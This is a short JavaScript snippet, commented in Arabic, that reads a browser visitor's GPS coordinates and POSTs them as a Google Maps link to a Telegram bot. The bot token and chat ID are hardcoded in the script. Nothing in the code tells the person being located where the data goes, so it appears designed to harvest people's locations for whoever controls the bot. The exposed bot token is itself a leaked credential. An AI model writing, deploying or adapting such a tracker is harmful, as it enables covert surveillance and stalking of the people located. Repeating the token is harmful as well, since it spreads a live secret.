function sendLocation(lat, lon) {
  const token = '8250616721:AAHTMwBPgPoRmNuRSfdGCA0lB9G_6LH2jy0';
  const chatId = '7301527017';  // هذا هو معرف الشات الصحيح
  const url = `https://api.telegram.org/bot${token}/sendMessage`;
  const data = {
    chat_id: chatId,
    text: `📍 موقع جديد:\nhttps://maps.google.com/?q=${lat},${lon}`
  };

  fetch(url, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(data)
  });
}

function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      function(position) {
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;
        sendLocation(lat, lon);
      },
      function(error) {
        console.error("فشل في الحصول على الموقع:", error);
      }
    );
  } else {
    console.log("المتصفح لا يدعم GPS");
  }
}
